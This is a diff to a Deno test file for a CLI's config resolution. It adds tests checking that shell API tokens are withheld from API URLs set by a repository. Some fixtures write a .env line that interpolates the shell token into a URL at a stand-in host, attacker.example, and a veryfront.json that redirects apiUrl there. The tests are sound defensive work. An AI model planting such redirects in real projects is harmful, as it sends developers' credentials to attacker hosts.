@@ -4,13 +4,14 @@ import "#veryfront/schemas/_test-setup.ts";
  * @module cli/shared/config.test
  */
 
-import { assertEquals, assertRejects } from "#veryfront/testing/assert.ts";
+import { assertEquals, assertInstanceOf, assertRejects } from "#veryfront/testing/assert.ts";
 import { describe, it } from "#veryfront/testing/bdd.ts";
 import {
   createApiClient,
   isRetryableApiReadError,
   isUntrustedApiUrlCredentialError,
   readConfigFile,
+  resolveApiCredentialCandidatesForAuth,
   resolveConfig,
   resolveConfigWithAuth,
   resolveConfigWithAuthDetails,
@@ -288,6 +289,7 @@ describe("resolveConfig", () => {
       const env = createMockEnv({ apiToken: "env-token" });
 
       const error = await assertRejects(() => resolveConfig(tempDir, env), Error);
+      assertInstanceOf(error, Error);
 
       assertEquals(error.message.includes("hunter2"), false);
       assertEquals(error.message.includes("attacker.example"), true);
@@ -373,6 +375,87 @@ describe("resolveConfig", () => {
     }
   });
 
+  it("accepts a project .env that names the default endpoint in another spelling", async () => {
+    const tempDir = await makeTempDir();
+    const originalApiUrl = Deno.env.get("VERYFRONT_API_URL");
+
+    try {
+      __resetEnvLoaderForTests();
+      Deno.env.delete("VERYFRONT_API_URL");
+      await Deno.writeTextFile(
+        join(tempDir, ".env"),
+        "VERYFRONT_API_URL=https://API.VERYFRONT.COM:443\n",
+      );
+      await loadEnv({ cwd: tempDir });
+
+      const env = createMockEnv({
+        apiUrl: "https://API.VERYFRONT.COM:443",
+        apiToken: "shell-token",
+        projectSlug: "test-project",
+      });
+
+      // The env file redirects nothing, so the shell token still travels.
+      const config = await resolveConfig(tempDir, env);
+
+      assertEquals(config.apiToken, "shell-token");
+      assertEquals(config.apiTokenSource, "env");
+    } finally {
+      __resetEnvLoaderForTests();
+      await Deno.remove(tempDir, { recursive: true });
+
+      if (originalApiUrl === undefined) {
+        Deno.env.delete("VERYFRONT_API_URL");
+      } else {
+        Deno.env.set("VERYFRONT_API_URL", originalApiUrl);
+      }
+    }
+  });
+
+  it("keeps a shell token expanded into the .env URL out of the refusal", async () => {
+    const tempDir = await makeTempDir();
+    const originalApiUrl = Deno.env.get("VERYFRONT_API_URL");
+    const originalApiToken = Deno.env.get("VERYFRONT_API_TOKEN");
+    const shellToken = "vf_shell_token_do_not_echo";
+
+    try {
+      __resetEnvLoaderForTests();
+      Deno.env.delete("VERYFRONT_API_URL");
+      // The shell holds the credential; the repository's .env interpolates it
+      // into a URL path, where userinfo stripping alone would never find it.
+      Deno.env.set("VERYFRONT_API_TOKEN", shellToken);
+      await Deno.writeTextFile(
+        join(tempDir, ".env"),
+        "VERYFRONT_API_URL=https://attacker.example/$VERYFRONT_API_TOKEN\n",
+      );
+      await loadEnv({ cwd: tempDir });
+
+      const steeredUrl = Deno.env.get("VERYFRONT_API_URL");
+      assertEquals(steeredUrl?.includes(shellToken), true);
+
+      const env = createMockEnv({ apiUrl: steeredUrl, apiToken: shellToken });
+
+      const error = await assertRejects(() => resolveConfig(tempDir, env), Error);
+      assertInstanceOf(error, Error);
+
+      assertEquals(error.message.includes(shellToken), false);
+      assertEquals(error.message.includes("attacker.example"), true);
+    } finally {
+      __resetEnvLoaderForTests();
+      await Deno.remove(tempDir, { recursive: true });
+
+      if (originalApiUrl === undefined) {
+        Deno.env.delete("VERYFRONT_API_URL");
+      } else {
+        Deno.env.set("VERYFRONT_API_URL", originalApiUrl);
+      }
+      if (originalApiToken === undefined) {
+        Deno.env.delete("VERYFRONT_API_TOKEN");
+      } else {
+        Deno.env.set("VERYFRONT_API_TOKEN", originalApiToken);
+      }
+    }
+  });
+
   it("marks the refusal so callers cannot rebuild the configuration around it", async () => {
     const tempDir = await makeTempDir();
     try {
@@ -390,6 +473,74 @@ describe("resolveConfig", () => {
 
       assertEquals(isUntrustedApiUrlCredentialError(error), true);
       assertEquals(isUntrustedApiUrlCredentialError(new Error("unrelated")), false);
+    } finally {
+      await Deno.remove(tempDir, { recursive: true });
+    }
+  });
+});
+
+describe("resolveApiCredentialCandidatesForAuth", () => {
+  it("offers no ambient credential for validation against a repository-steered host", async () => {
+    const tempDir = await makeTempDir();
+    try {
+      await Deno.writeTextFile(
+        join(tempDir, "veryfront.json"),
+        JSON.stringify({
+          projectSlug: "from-json",
+          apiUrl: "https://attacker.example",
+        }),
+      );
+
+      const env = createMockEnv({ apiToken: "shell-token" });
+
+      // login, whoami, and up validate each candidate by sending it to
+      // candidate.validationEnv.apiUrl, so an unfiltered list would hand the
+      // shell token to the repository's host before resolveConfig ever runs.
+      const candidates = await resolveApiCredentialCandidatesForAuth(env, tempDir, false);
+
+      assertEquals(candidates.length, 0);
+    } finally {
+      await Deno.remove(tempDir, { recursive: true });
+    }
+  });
+
+  it("still offers a token that the same veryfront.json supplied", async () => {
+    const tempDir = await makeTempDir();
+    try {
+      await Deno.writeTextFile(
+        join(tempDir, "veryfront.json"),
+        JSON.stringify({
+          projectSlug: "from-json",
+          apiUrl: "https://attacker.example",
+          apiToken: "config-file-token",
+        }),
+      );
+
+      const env = createMockEnv({ apiToken: "shell-token" });
+
+      const candidates = await resolveApiCredentialCandidatesForAuth(env, tempDir, false);
+
+      assertEquals(candidates.map((candidate) => candidate.apiToken), ["config-file-token"]);
+      assertEquals(candidates[0]?.validationEnv.apiUrl, "https://attacker.example");
+    } finally {
+      await Deno.remove(tempDir, { recursive: true });
+    }
+  });
+
+  it("leaves the shell token in place when the repository steers nothing", async () => {
+    const tempDir = await makeTempDir();
+    try {
+      await Deno.writeTextFile(
+        join(tempDir, "veryfront.json"),
+        JSON.stringify({ projectSlug: "from-json" }),
+      );
+
+      const env = createMockEnv({ apiToken: "shell-token" });
+
+      const candidates = await resolveApiCredentialCandidatesForAuth(env, tempDir, false);
+
+      assertEquals(candidates[0]?.apiToken, "shell-token");
+      assertEquals(candidates[0]?.apiTokenSource, "env");
     } finally {
       await Deno.remove(tempDir, { recursive: true });
     }
